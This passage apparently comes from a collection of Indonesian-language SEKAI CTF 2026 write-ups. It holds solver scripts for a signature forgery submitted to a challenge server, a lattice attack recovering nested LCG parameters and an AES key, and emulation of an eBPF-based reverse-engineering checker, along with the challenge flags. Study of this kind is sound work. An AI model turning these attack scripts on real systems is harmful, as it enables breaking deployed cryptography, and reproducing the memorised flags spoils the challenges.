-107631964056951800557466914111042, -8573529275242806098942469931118, -95458435378604668063958905216477, -8689823097076084341720496621936, -7126905667270907277248176244375, -1567596629013884739625089994775, 51110705111752880611788890999135, -538257065087870699685826025094, -66831420409348571997231010648297, 108610880913779523563741244609024, -109621459980401025729562514193763, 47633905500020777054704020497731, 3533399720313787567803333997587, -10751023464689353643265633938361, 21726042042207469270847966802508, -76863151275281290419502031513879, -9956993349352672660353825239343, 66192556265035132020901762303837, -10719955345031647924041190642497, -2759349882673775566918331575361, 8074315055731330405105021300410, 29130809125042607284832439041214, 5070491950444572776377749229299, 12311464194161630107387392629482, -22668883174413672586070664565843, -4591041275548874524048681796674, -17998047915049713072695695177703, -8437070363930636189595461700302, 11585421075235376051211128165652, -18297709526906212241781285887652, -1457674184362399641745238595593, -8813108671189274650204185292128, -7839655247751315947691025475266, 49169201299104361335860160129714, 10174907659409664559926202562464, 12157878867610295352852298032375, 3104845414667133557625860324499, 12196056388532560197863641385374, -3665260395592875128192042697808, -5821784861986588779148215900471, 13424936787038112043771355306449, -53711965653048961684978327258597, 5415572483966478462531444282000, 5732823974279733664296244478157, -9097954261963018311979325946417, -53377812081964842303226137665393, -9231686826125022050387661788804, -6895544287438044802427733549083, 7333319229269977333412938381127, 5586011206519758001314472446496, 54905936236078735302426835525794, 15603202299919016578351663514488, -76078190608017407458353660237832, 78491840612939759657428802365008, 77543547336461309671810751573533, -6100942191462490849529595177933, -4827555389422026318975719670707, 42789190136617509827823784818298, 58179859605290525388770266895476, -8190098749880941340961968401922, -25624245075313580814078407194758, 5394388578221947417180658160847, -267369039435846488035537626262, -32949997857395868911961135323520, 21835594422537623720827723114819, 2063863782282369073289132460748, -4250424118424428658973218487447, 293272276368233891695442645924729, 57355870038570964753062204652621, 3983878042600669221426249063468, -54077800240953851374686057174111, 6141004102486526510927968549454, 11880500438590356736788192270947, 6071047187826123401533403968512, 68966026148282145206796889063522, -25089349256886393859768868464301, 9916890181710677654708228490366, -16235170461898341484453434374238, -25388228345251402752883191792765, -11227417708192749280591637239218, 66979183757283562597569673863933, -4104450891245635052325127348509, 12592235801874167122888972460195, 34209400924041358797476131558813, 17100027479698621281064919139207, 6950988153397427935358219970618, -15227777820239185948285380498684, -23324289730779035444123179430513, 11263926116990436549500941794494, -50918099192172244213768015821763, -8192744709166264579331538742170, 10268779546532767023577454304848, -3939177776720259295450614734450, 455946704859343068623177981361, -76501158383258960708094726400037, -49605505584025517461201293391833, -26662357688023662028123408050700, 6606761577030946021075159963535, -47491531135019613218048216256866, 47346519744383866606658587140071, 11718414311745607212919458041758, -45607192206976008108078548257416, 15751450588955345202143364577191, 19660140937698703603464569742753, -34425006544220118296192451310333, -6536263313531652106447697936106, 27673339331955895507355768985391]\r\n\r\n\r\ndef load_public_matrix(path: str | Path) -> list[list[int]]:\r\n    \"\"\"Parse Sage's compressed pickle without requiring SageMath.\"\"\"\r\n    raw = zlib.decompress(Path(path).read_bytes())\r\n    packed = next(\r\n        arg\r\n        for opcode, arg, _ in pickletools.genops(raw)\r\n        if opcode.name == \"BINUNICODE\"\r\n        and isinstance(arg, str)\r\n        and len(arg) > 100_000\r\n    )\r\n    values = [int(token, 32) for token in packed.split()]\r\n    n = 144\r\n    if len(values) != n * n:\r\n        raise ValueError(f\"unexpected public matrix size: {len(values)}\")\r\n    return [values[i * n : (i + 1) * n] for i in range(n)]\r\n\r\n\r\ndef target_integer() -> int:\r\n    from hashlib import sha256\r\n\r\n    return int.from_bytes(b\"\\x01\" + sha256(TARGET_MESSAGE).digest(), \"big\")\r\n\r\n\r\ndef quadratic_form(vector: list[int], matrix: list[list[int]]) -> int:\r\n    return sum(\r\n        vector[i] * sum(matrix[i][j] * vector[j] for j in range(144))\r\n        for i in range(144)\r\n    )\r\n\r\n\r\ndef verify_local(pk_path: str | Path) -> None:\r\n    if len(SIGNATURE) != 144:\r\n        raise ValueError(f\"signature has {len(SIGNATURE)} entries, expected 144\")\r\n    matrix = load_public_matrix(pk_path)\r\n    actual = quadratic_form(SIGNATURE, matrix)\r\n    expected = target_integer()\r\n    if actual != expected:\r\n        raise ValueError(\"embedded signature does not verify\")\r\n    print(\"[+] Local verification passed\")\r\n\r\n\r\ndef receive_available(sock: socket.socket, timeout: float = 2.0) -> bytes:\r\n    sock.settimeout(timeout)\r\n    chunks: list[bytes] = []\r\n    while True:\r\n        try:\r\n            chunk = sock.recv(65536)\r\n        except socket.timeout:\r\n            break\r\n        if not chunk:\r\n            break\r\n        chunks.append(chunk)\r\n    return b\"\".join(chunks)\r\n\r\n\r\ndef exploit(host: str, port: int, timeout: float) -> str:\r\n    payload = \" \".join(map(str, SIGNATURE)).encode() + b\"\\n\"\r\n\r\n    with socket.create_connection((host, port), timeout=timeout) as sock:\r\n        banner = receive_available(sock, timeout=1.0)\r\n        if banner:\r\n            sys.stdout.write(banner.decode(errors=\"replace\"))\r\n            sys.stdout.flush()\r\n\r\n        sock.sendall(payload)\r\n        response = receive_available(sock, timeout=timeout).decode(errors=\"replace\")\r\n\r\n    print(response, end=\"\" if response.endswith(\"\\n\") else \"\\n\")\r\n    match = re.search(r\"SEKAI\\{[^}]+\\}\", response)\r\n    if not match:\r\n        raise RuntimeError(\"server response did not contain a SEKAI flag\")\r\n\r\n    flag = match.group(0)\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n    return flag\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=DEFAULT_HOST)\r\n    parser.add_argument(\"--port\", type=int, default=DEFAULT_PORT)\r\n    parser.add_argument(\"--timeout\", type=float, default=10.0)\r\n    parser.add_argument(\"--pk\", default=\"pk.sobj\")\r\n    parser.add_argument(\r\n        \"--verify-only\",\r\n        action=\"store_true\",\r\n        help=\"verify the embedded signature locally and do not connect\",\r\n    )\r\n    parser.add_argument(\r\n        \"--skip-local-verify\",\r\n        action=\"store_true\",\r\n        help=\"connect even when pk.sobj is not available locally\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    if not args.skip_local_verify:\r\n        verify_local(args.pk)\r\n    if not args.verify_only:\r\n        exploit(args.host, args.port, args.timeout)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "```text\nSEKAI{y0U_f0uND_th3_n33dL3!!!_https://youtu.be/Sloi-L5FHBY}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-crypto-orbital-strike-cryptoorbital-strike",
    "title": "orbital-strike",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "**CTF:** SEKAI CTF 2026  \n**Category:** Crypto  \n**Flag:** `SEKAI{orbital_strike_like_miku_miku_beam!!!}`",
    "problemDescription": "`X` dipakai langsung sebagai key AES-256-ECB, tetapi tidak pernah dicetak. Nilai yang tersedia hanya 14 output dari LCG luar:\n\n```text\nmoon_i = (a * moon_(i-1) + b) mod p\norbit_i = (A * orbit_(i-1) + moon_i) mod P\n```\n\nModulusnya berbeda ukuran:\n\n```text\nP = prime 256 bit\np = prime 311 bit\n```\n\nSerangannya tidak menebak parameter LCG. Selisih output `orbit` dimasukkan ke lattice untuk mencari relasi linear pendek. Resultant dari relasi tersebut membocorkan `p`, lalu akar polinomial bersama membocorkan `a`. Setelah selisih state LCG dalam pulih, `P`, `A`, dan akhirnya `X` dapat dihitung.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Selisih output",
        "content": "Misalkan output yang diketahui adalah `y_1, ..., y_14` dan:\n\n\n\nDibuat lattice dengan 11 baris:\n\n\n\n`e_i` adalah basis identitas berdimensi 11. Setelah LLL, beberapa baris mempunyai tiga koordinat awal bernilai nol. Bagian sisanya memberi koefisien pendek `l_0, ..., l_10` yang memenuhi:\n\n\n\nPada data challenge, enam relasi terpendek adalah relasi asli dari LCG dalam.",
        "code": "d_i = y_(i+1) - y_i"
      },
      {
        "title": "2. Memulihkan `p` dan `a`",
        "content": "Untuk state bulan `m_i`, definisikan:\n\n\n\nKarena state bulan berasal dari LCG:\n\n\n\nJika relasi lattice ditulis sebagai polinomial:\n\n\n\nmaka relasi yang benar memenuhi:\n\n\n\nDua polinomial yang memiliki akar bersama modulo `p` mempunyai resultant yang habis dibagi `p`. GCD beberapa pairwise resultant menghasilkan:\n\n\n\nSetelah semua polinomial direduksi modulo `p`, polynomial GCD-nya linear:\n\n\n\nJadi:",
        "code": "delta_i = m_(i+1) - m_i"
      },
      {
        "title": "3. Memulihkan selisih state bulan",
        "content": "Enam relasi yang valid ditempatkan pada dua offset:\n\n\n\nMatriks blok ini mempunyai integer kernel berdimensi tiga. Basis kernel direduksi dengan LLL, lalu koefisien kombinasinya dipaksa memenuhi:\n\n\n\nConstraint modular tersebut menyisakan satu dimensi. LLL kedua menghasilkan vektor bertanda:\n\n\n\nSetiap elemennya berada pada interval `(-p, p)` dan merepresentasikan selisih state bulan sebagai integer biasa, bukan hanya residue modulo `p`.",
        "code": "[l_0 ... l_10 0]\n[0 l_0 ... l_10]"
      },
      {
        "title": "4. Memulihkan `P` dan `A`",
        "content": "Dari LCG luar:\n\n\n\nKurangi dua persamaan berurutan:\n\n\n\natau:\n\n\n\nEliminasi `A` dari dua indeks `i` dan `j`:\n\n\n\nSemua `C_(i,j)` habis dibagi modulus luar `P`. GCD seluruh cross-product memberi:\n\n\n\nMultiplier luar dihitung dari salah satu persamaan modular:\n\n\n\nHasilnya:",
        "code": "m_i = y_i - A*y_(i-1) mod P"
      },
      {
        "title": "5. Memulihkan `X`",
        "content": "State bulan kedua diketahui modulo `P`:\n\n\n\nSelisih sebelumnya diperoleh dengan membalik recurrence:\n\n\n\nAda dua representasi bertanda, yaitu `r` atau `r-p`. Hanya satu yang memungkinkan seluruh state `m_1, ..., m_14` tetap berada pada interval `[0, p)`.\n\nSetelah `m_1 mod P` diketahui:\n\n\n\nNilainya:",
        "code": "m_2 = y_2 - A*y_1 mod P"
      },
      {
        "title": "6. Dekripsi",
        "content": "Ciphertext dienkripsi memakai AES-256-ECB dan PKCS#7 padding:\n\n\n\nHasil dekripsi:\n\n\n\nSolver juga meregenerasi seluruh 14 output `orbit` sebelum menerima flag, sehingga parameter hasil recovery tidak hanya lolos padding AES.",
        "code": "plaintext = unpad(\n    AES.new(X.to_bytes(32, \"big\"), AES.MODE_ECB).decrypt(bytes.fromhex(star)),\n    16,\n)"
      },
      {
        "title": "Menjalankan solver",
        "content": "Output:",
        "code": "source /home/nata/ctf_env/bin/activate\npip install pycryptodome sympy fpylll cysignals\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Solver for SEKAI CTF 2026 Crypto - orbital-strike.\r\n\r\nDependencies:\r\n    pip install pycryptodome sympy fpylll cysignals\r\n\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport itertools\r\nimport math\r\nimport re\r\nfrom dataclasses import dataclass\r\n\r\nimport sympy as sp\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Util.Padding import unpad\r\nfrom fpylll import IntegerMatrix, LLL\r\n\r\nORBIT = [\r\n    46157012221654917396851254347154820393060391878580715960476654689260395468184,\r\n    36926194633341127588542680684095293820802193681748458943524916140809713523560,\r\n    16005201943847263206512436577001283414470030273089746675203830598137794555134,\r\n    28937919714389596084610407023450127584695575606301484773390370819366639643218,\r\n    11459012353705334109041842799942754581703065868230253271729711591416155557180,\r\n    31030059279554219046464541926833857543445131889728181065565033726460506326840,\r\n    20987315604501021667042879662101693092441980938033961081037347214532349371248,\r\n    76741461130245451493723909055453557280102065396647043801270629949855565452326,\r\n    84258885183671683674472390974667571532577240974449641001706593550302243268268,\r\n    59535034089467707172052245359810812420431903279354584714432674122159502991956,\r\n    7115679899033391144975170596669540596311296590450661546000723388170577963715,\r\n    35572951991838484594163260879328705523576344587262461128887804475450813563036,\r\n    85569022704397114858282741078883377190544624744955636482627379979792474136036,\r\n    5047270986830280372910174287287823507537624765267582560460157826800286170460,\r\n]\r\nSTAR = bytes.fromhex(\r\n    \"1664ff83cbca2643b357bcdc8c3d6e15\"\r\n    \"48615a18cec73e734a82e163b32a9b0c\"\r\n    \"367c61bab01140a04ac8eda8b007d1d6\"\r\n)\r\n\r\n\r\n@dataclass(frozen=True)\r\nclass Recovered:\r\n    P: int\r\n    p: int\r\n    A: int\r\n    a: int\r\n    b: int\r\n    X: int\r\n    moons: tuple[int, ...]\r\n    flag: bytes\r\n\r\n\r\ndef vector_bits(v: list[int]) -> int:\r\n    return max((abs(x).bit_length() for x in v), default=0)\r\n\r\n\r\ndef build_public_kernel(differences: list[int]) -> list[list[int]]:\r\n    \"\"\"Find short polynomials annihilating three shifted orbit-difference windows.\"\"\"\r\n    n_windows = 11\r\n    shifts = 3\r\n    scale = 1 << 512\r\n\r\n    basis = IntegerMatrix(n_windows, n_windows + shifts)\r\n    for i in range(n_windows):\r\n        for j in range(shifts):\r\n            basis[i, j] = scale * differences[i + j]\r\n        basis[i, shifts + i] = 1\r\n\r\n    LLL.reduction(basis, delta=0.999)\r\n\r\n    rows: list[list[int]] = []\r\n    for row in range(n_windows):\r\n        prefix = [int(basis[row, j]) for j in range(shifts)]\r\n        coeffs = [int(basis[row, shifts + i]) for i in range(n_windows)]\r\n        if prefix == [0, 0, 0]:\r\n            rows.append(coeffs)\r\n\r\n    rows.sort(key=lambda v: (vector_bits(v), sum(x * x for x in v)))\r\n    if len(rows) < 6:\r\n        raise RuntimeError(\"failed to recover enough exact public-kernel vectors\")\r\n    return rows\r\n\r\n\r\ndef prime_factor_with_bits(value: int, bits: int) -> int | None:\r\n    value = abs(value)\r\n    if value <= 1:\r\n        return None\r\n    if value.bit_length() == bits and sp.isprime(value):\r\n        return value\r\n\r\n    # In this instance the cofactor is tiny. A bounded factorization strips it\r\n    # and leaves the 311-bit prime intact.\r\n    factors = sp.factorint(value, limit=100_000)\r\n    for factor in factors:\r\n        q = int(factor)\r\n        if q.bit_length() == bits and sp.isprime(q):\r\n            return q\r\n    return None\r\n\r\n\r\ndef recover_inner_parameters(kernel_rows: list[list[int]]) -> tuple[int, int, list[list[int]]]:\r\n    \"\"\"Recover inner modulus p and multiplier a from polynomial resultants.\"\"\"\r\n    x = sp.symbols(\"x\")\r\n    polynomials = [\r\n        sp.Poly(sum(c * x**i for i, c in enumerate(row)), x, domain=sp.ZZ)\r\n        for row in kernel_rows\r\n    ]\r\n\r\n    p: int | None = None\r\n    selected_count = 0\r\n\r\n    # The true relations form the visibly short prefix of the reduced basis.\r\n    # Their pairwise resultants all contain the same 311-bit prime.\r\n    for take in range(3, len(polynomials) + 1):\r\n        common = 0\r\n        for i, j in itertools.combinations(range(take), 2):\r\n            resultant = abs(int(sp.resultant(polynomials[i], polynomials[j], x)))\r\n            common = math.gcd(common, resultant)\r\n        candidate = prime_factor_with_bits(common, 311)\r\n        if candidate is not None:\r\n            p = candidate\r\n            selected_count = take\r\n            break\r\n\r\n    if p is None:\r\n        raise RuntimeError(\"311-bit common resultant factor was not found\")\r\n\r\n    polynomial_gcd = sp.Poly(polynomials[0], modulus=p)\r\n    for poly in polynomials[1:selected_count]:\r\n        polynomial_gcd = sp.gcd(polynomial_gcd, sp.Poly(poly, modulus=p))\r\n\r\n    if polynomial_gcd.degree() != 1:\r\n        raise RuntimeError(f\"unexpected polynomial gcd degree: {polynomial_gcd.degree()}\")\r\n\r\n    leading, constant = [int(c) % p for c in polynomial_gcd.all_coeffs()]\r\n    a = (-constant * pow(leading, -1, p)) % p\r\n\r\n    good_rows = [\r\n        row\r\n        for row in kernel_rows\r\n        if sum(c * pow(a, i, p) for i, c in enumerate(row)) % p == 0\r\n    ]\r\n    good_rows.sort(key=lambda v: (vector_bits(v), sum(x * x for x in v)))\r\n    if len(good_rows) < 6:\r\n        raise RuntimeError(\"not enough inner-LCG annihilators after root validation\")\r\n\r\n    # Six independent relations are enough for the shifted block kernel.\r\n    return p, a, good_rows[:6]\r\n\r\n\r\ndef orthogonal_kernel(relations: list[list[int]]) -> list[list[int]]:\r\n    \"\"\"Compute the 3-dimensional integer kernel of shifted relations.\"\"\"\r\n    block_rows: list[list[int]] = []\r\n    for relation in relations:\r\n        block_rows.append(relation + [0])\r\n        block_rows.append([0] + relation)\r\n\r\n    dimension = 12\r\n    scale = 1 << 1024\r\n    embedded = IntegerMatrix(dimension, dimension * 2)\r\n\r\n    # A vector z is orthogonal to every block row iff the scaled prefix is 0.\r\n    for i in range(dimension):\r\n        for j in range(dimension):\r\n            embedded[i, j] = scale * block_rows[j][i]\r\n        embedded[i, dimension + i] = 1\r\n\r\n    LLL.reduction(embedded, delta=0.999)\r\n\r\n    vectors: list[list[int]] = []\r\n    for row in range(dimension):\r\n        prefix = [int(embedded[row, j]) for j in range(dimension)]\r\n        if all(x == 0 for x in prefix):\r\n            vectors.append([int(embedded[row, dimension + j]) for j in range(dimension)])\r\n\r\n    if len(vectors) != 3:\r\n        raise RuntimeError(f\"unexpected shifted-kernel rank: {len(vectors)}\")\r\n    return vectors\r\n\r\n\r\ndef nullspace_mod_prime(matrix: list[list[int]], modulus: int) -> list[list[int]]:\r\n    \"\"\"Reduced-row-echelon nullspace over F_modulus.\"\"\"\r\n    work = [[x % modulus for x in row] for row in matrix]\r\n    row_count = len(work)\r\n    col_count = len(work[0])\r\n    pivots: list[int] = []\r\n    pivot_row = 0\r\n\r\n    for column in range(col_count):\r\n        selected = next(\r\n            (r for r in range(pivot_row, row_count) if work[r][column] != 0),\r\n            None,\r\n        )\r\n        if selected is None:\r\n            continue\r\n\r\n        work[pivot_row], work[selected] = work[selected], work[pivot_row]\r\n        inverse = pow(work[pivot_row][column], -1, modulus)\r\n        work[pivot_row] = [(x * inverse) % modulus for x in work[pivot_row]]\r\n\r\n        for r in range(row_count):\r\n            if r == pivot_row or work[r][column] == 0:\r\n                continue\r\n            factor = work[r][column]\r\n            work[r] = [\r\n                (work[r][c] - factor * work[pivot_row][c]) % modulus\r\n                for c in range(col_count)\r\n            ]\r\n\r\n        pivots.append(column)\r\n        pivot_row += 1\r\n\r\n    free_columns = [c for c in range(col_count) if c not in pivots]\r\n    result: list[list[int]] = []\r\n    for free in free_columns:\r\n        vector = [0] * col_count\r\n        vector[free] = 1\r\n        for r, pivot in reversed(list(enumerate(pivots))):\r\n            vector[pivot] = -sum(\r\n                work[r][c] * vector[c] for c in free_columns\r\n            ) % modulus\r\n        result.append(vector)\r\n    return result\r\n\r\n\r\ndef recover_moon_differences(p: int, a: int, relations: list[list[int]]) -> list[list[int]]:\r\n    \"\"\"Recover signed differences delta_2..delta_13 of the inner LCG.\"\"\"\r\n    kernel = orthogonal_kernel(relations)\r\n\r\n    recurrence_matrix = [\r\n        [\r\n            (kernel[j][i + 1] - a * kernel[j][i]) % p\r\n            for j in range(len(kernel))\r\n        ]\r\n        for i in range(11)\r\n    ]\r\n    coefficient_nullspace = nullspace_mod_prime(recurrence_matrix, p)\r\n    if len(coefficient_nullspace) != 1:\r\n        raise RuntimeError(\"inner recurrence did not leave a one-dimensional coefficient space\")\r\n\r\n    coefficient_vector = coefficient_nullspace[0]\r\n    generators = [\r\n        [\r\n            sum(coefficient_vector[j] * kernel[j][i] for j in range(3))\r\n            for i in range(12)\r\n        ]\r\n    ]\r\n    for j in range(3):\r\n        generators.append([p * kernel[j][i] for i in range(12)])\r\n\r\n    lattice = IntegerMatrix(len(generators), 12)\r\n    for i, row in enumerate(generators):\r\n        for j, value in enumerate(row):\r\n            lattice[i, j] = value\r\n    LLL.reduction(lattice, delta=0.999)\r\n\r\n    candidates: list[list[int]] = []\r\n    seen: set[tuple[int, ...]] = set()\r\n    for row in range(len(generators)):\r\n        vector = [int(lattice[row, i]) for i in range(12)]\r\n        if not any(vector):\r\n            continue\r\n        if max(abs(x) for x in vector) >= p:\r\n            continue\r\n        if not all((vector[i + 1] - a * vector[i]) % p == 0 for i in range(11)):\r\n            continue\r\n\r\n        for oriented in (vector, [-x for x in vector]):\r\n            key = tuple(oriented)\r\n            if key not in seen:\r\n                seen.add(key)\r\n                candidates.append(oriented)\r\n\r\n    if not candidates:\r\n        raise RuntimeError(\"no bounded moon-difference vector found\")\r\n    return candidates\r\n\r\n\r\ndef candidate_prime_factors(value: int, bits: int) -> list[int]:\r\n    value = abs(value)\r\n    if value <= 1:\r\n        return []\r\n    if value.bit_length() == bits and sp.isprime(value):\r\n        return [value]\r\n    return [\r\n        int(q)\r\n        for q in sp.factorint(value, limit=100_000)\r\n        if int(q).bit_length() == bits and sp.isprime(int(q))\r\n    ]\r\n\r\n\r\ndef interval_for_m2(p: int, delta1: int, later_deltas: list[int]) -> tuple[int, int]:\r\n    \"\"\"Return [lo, hi) such that all reconstructed moon states are in [0,p).\"\"\"\r\n    offsets = [-delta1, 0]  # m1-m2, m2-m2\r\n    cumulative = 0\r\n    for delta in later_deltas:\r\n        cumulative += delta\r\n        offsets.append(cumulative)\r\n    return max(-x for x in offsets), min(p - x for x in offsets)\r\n\r\n\r\ndef try_outer_recovery(\r\n    p: int,\r\n    a: int,\r\n    moon_differences: list[int],\r\n    orbit: list[int],\r\n    ciphertext: bytes,\r\n) -> Recovered | None:\r\n    d = [orbit[i + 1] - orbit[i] for i in range(len(orbit) - 1)]\r\n\r\n    # delta_n = d_n - A*d_(n-1) (mod P), n=2..13.\r\n    left = [d[i + 1] - moon_differences[i] for i in range(12)]\r\n    right = d[:12]\r\n\r\n    common = 0\r\n    for i, j in itertools.combinations(range(12), 2):\r\n        common = math.gcd(common, abs(left[i] * right[j] - left[j] * right[i]))\r\n\r\n    for P in candidate_prime_factors(common, 256):\r\n        if P <= max(orbit):\r\n            continue\r\n\r\n        A: int | None = None\r\n        for lhs, rhs in zip(left, right):\r\n            if math.gcd(rhs, P) == 1:\r\n                A = (lhs * pow(rhs, -1, P)) % P\r\n                break\r\n        if A is None or A == 0:\r\n            continue\r\n        if not all((lhs - A * rhs) % P == 0 for lhs, rhs in zip(left, right)):\r\n            continue\r\n\r\n        m2_residue = (orbit[1] - A * orbit[0]) % P\r\n        delta1_residue = (pow(a, -1, p) * (moon_differences[0] % p)) % p\r\n\r\n        for delta1 in (delta1_residue, delta1_residue - p):\r\n            lo, hi = interval_for_m2(p, delta1, moon_differences)\r\n            k_min = max(0, (lo - m2_residue + P - 1) // P)\r\n            k_max = (hi - 1 - m2_residue) // P\r\n            if k_min > k_max:\r\n                continue\r\n\r\n            # Any valid lift gives the same m1 modulo P and therefore the same X.\r\n            m2 = m2_residue + k_min * P\r\n            m1 = m2 - delta1\r\n            moons = [m1, m2]\r\n            for delta in moon_differences:\r\n                moons.append(moons[-1] + delta)\r\n\r\n            if len(moons) != 14 or not all(0 <= m < p for m in moons):\r\n                continue\r\n\r\n            b = (moons[1] - a * moons[0]) % p\r\n            if not all(moons[i + 1] == (a * moons[i] + b) % p for i in range(13)):\r\n                continue\r\n\r\n            m1_mod_P = (m2_residue - delta1) % P\r\n            X = ((orbit[0] - m1_mod_P) * pow(A, -1, P)) % P\r\n\r\n            state = X\r\n            regenerated: list[int] = []\r\n            for moon in moons:\r\n                state = (A * state + moon) % P\r\n                regenerated.append(state)\r\n            if regenerated != orbit:\r\n                continue\r\n\r\n            try:\r\n                plaintext = unpad(\r\n                    AES.new(X.to_bytes(32, \"big\"), AES.MODE_ECB).decrypt(ciphertext),\r\n                    16,\r\n                )\r\n            except ValueError:\r\n                continue\r\n\r\n            if re.fullmatch(rb\"[A-Za-z0-9_]+\\{[^\\r\\n{}]+\\}\", plaintext) is None:\r\n                continue\r\n\r\n            return Recovered(P, p, A, a, b, X, tuple(moons), plaintext)\r\n\r\n    return None\r\n\r\n\r\ndef solve(orbit: list[int], ciphertext: bytes) -> Recovered:\r\n    if len(orbit) != 14:\r\n        raise ValueError(\"the attack expects exactly 14 orbit outputs\")\r\n\r\n    differences = [orbit[i + 1] - orbit[i] for i in range(13)]\r\n    public_kernel = build_public_kernel(differences)\r\n    p, a, relations = recover_inner_parameters(public_kernel)\r\n    delta_candidates = recover_moon_differences(p, a, relations)\r\n\r\n    for candidate in delta_candidates:\r\n        recovered = try_outer_recovery(p, a, candidate, orbit, ciphertext)\r\n        if recovered is not None:\r\n            return recovered\r\n    raise RuntimeError(\"all recovered moon-difference orientations failed validation\")\r\n\r\n\r\ndef main() -> None:\r\n    recovered = solve(ORBIT, STAR)\r\n    print(f\"[+] p = {recovered.p}\")\r\n    print(f\"[+] a = {recovered.a}\")\r\n    print(f\"[+] P = {recovered.P}\")\r\n    print(f\"[+] A = {recovered.A}\")\r\n    print(f\"[+] X = {recovered.X}\")\r\n    print(\"[+] full orbit regeneration: valid\")\r\n    print(f\"<FLAG>{recovered.flag.decode()}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "SEKAI{orbital_strike_like_miku_miku_beam!!!}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-rev-untitleuncore-revuntitled-encore",
    "title": "Untitled Encore — Reverse Engineering",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "Writeup for challenge Untitled Encore — Reverse Engineering",
    "problemDescription": "Binary menyimpan verifier berlapis: pemeriksaan struktur chart, sebuah VM C++ kecil, dan interpreter eBPF yang programnya tertanam sebagai ELF. Chart valid dipulihkan dari constraint opcode `0x44`, lalu fungsi verifier asli dijalankan dengan Unicorn untuk menghasilkan flag.\n\nFlag:\n\n```text\nSEKAI{eBPF_my_B3l0v3d}\n```",
    "tools": [],
    "analysis": "```bash\nfile untitled-encore.exe\nstrings -a untitled-encore.exe | grep -E 'check-chart|print-template|Sonolus|MISS'\n```\n\nString penting yang muncul:\n\n```text\n--check-chart <40-byte-chart-hex-or-file>\n--print-template\nMISS\n```\n\nMode `--check-chart` menerima tepat 40 byte. Chart terdiri dari 20 note, masing-masing dua byte:\n\n```text\nbyte 0: lane | kind << 3 | flick << 5 | parity << 6\nbyte 1: delta\n```\n\nBatas field yang diperiksa:\n\n- `lane`: 0–4\n- `kind`: 0–2\n- `flick`: 0–1\n- `delta`: 3–16\n- `parity`: `(lane - index) & 1`",
    "solution": [
      {
        "title": "ELF eBPF di dalam PE",
        "content": "Magic ELF ditemukan langsung di data PE:\n\n\n\nObjek tersebut adalah ELF64 eBPF dengan section `.text` dan `.rodata`. Fungsi parser internal mengambil `.rodata`, mencari container custom, lalu mengekstrak payload 388 byte.\n\nLayout container:\n\n\n\nSetiap record payload berukuran empat byte dan di-decode memakai offset byte record:\n\n\n\nUrutan program hasil decode:",
        "code": "binwalk untitled-encore.exe"
      },
      {
        "title": "Memulihkan chart",
        "content": "State awal VM:\n\n\n\nOpcode `0x21` mengikat delapan byte seed dan panjang chart. Update state-nya:\n\n\n\nUntuk opcode `0x44`, `a` adalah indeks note. Dua byte note diuji dengan:\n\n\n\nRuang kandidat per note hanya `5 × 3 × 2 × 14 = 420`. DFS pada 20 opcode menemukan satu chart yang juga lolos pemeriksaan summary:\n\n\n\nNilai summary-nya:\n\n\n\nSemua nilai sama dengan konstanta target di fungsi checker.",
        "code": "0x31c3f00d"
      },
      {
        "title": "Menjalankan solver",
        "content": "Output:",
        "code": "source /home/nata/ctf_env/bin/activate\npip install pefile unicorn\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport struct\r\nimport sys\r\nfrom pathlib import Path\r\nfrom typing import Iterable\r\n\r\ntry:\r\n    import pefile\r\n    from unicorn import (\r\n        Uc,\r\n        UcError,\r\n        UC_ARCH_X86,\r\n        UC_HOOK_CODE,\r\n        UC_HOOK_MEM_INVALID,\r\n        UC_MODE_64,\r\n    )\r\n    from unicorn.x86_const import (\r\n        UC_X86_REG_R8,\r\n        UC_X86_REG_RAX,\r\n        UC_X86_REG_RCX,\r\n        UC_X86_REG_RDX,\r\n        UC_X86_REG_RIP,\r\n        UC_X86_REG_RSP,\r\n    )\r\nexcept ImportError as exc:\r\n    raise SystemExit(\r\n        \"Dependency belum tersedia. Jalankan: pip install pefile unicorn\"\r\n    ) from exc\r\n\r\nROOT = Path(__file__).resolve().parent\r\nEXE = ROOT / \"untitled-encore.exe\"\r\n\r\n# RVA fungsi dan thunk yang dipakai jalur validasi.\r\nRVA_CHECK_CHART = 0x9D30\r\nRVA_THROW = 0x62A0\r\nRVA_MALLOC = 0xC824\r\nRVA_FREE = 0xC81E\r\nRVA_MEMCPY = 0xC7F4\r\nRVA_MEMMOVE = 0xC7FA\r\nRVA_MEMSET = 0xC800\r\nRVA_MEMCMP = 0xC7EE\r\nRVA_STRLEN = 0xC818\r\n\r\nTARGET_SUMMARY = (\r\n    0xD75245E2,\r\n    0x3BBE10E9,\r\n    0x3C500F48,\r\n    0x01EBD885,\r\n    [56, 34, 54, 33, 65],\r\n    [97, 73, 60],\r\n)\r\n\r\n\r\ndef rol32(value: int, count: int) -> int:\r\n    count &= 31\r\n    return ((value << count) | (value >> (32 - count))) & 0xFFFFFFFF\r\n\r\n\r\ndef extract_elf_rodata(exe_data: bytes) -> bytes:\r\n    \"\"\"Cari ELF eBPF ter-embed dan ambil section .rodata tanpa pyelftools.\"\"\"\r\n    elf_off = exe_data.find(b\"\\x7fELF\")\r\n    if elf_off < 0:\r\n        raise ValueError(\"ELF eBPF tidak 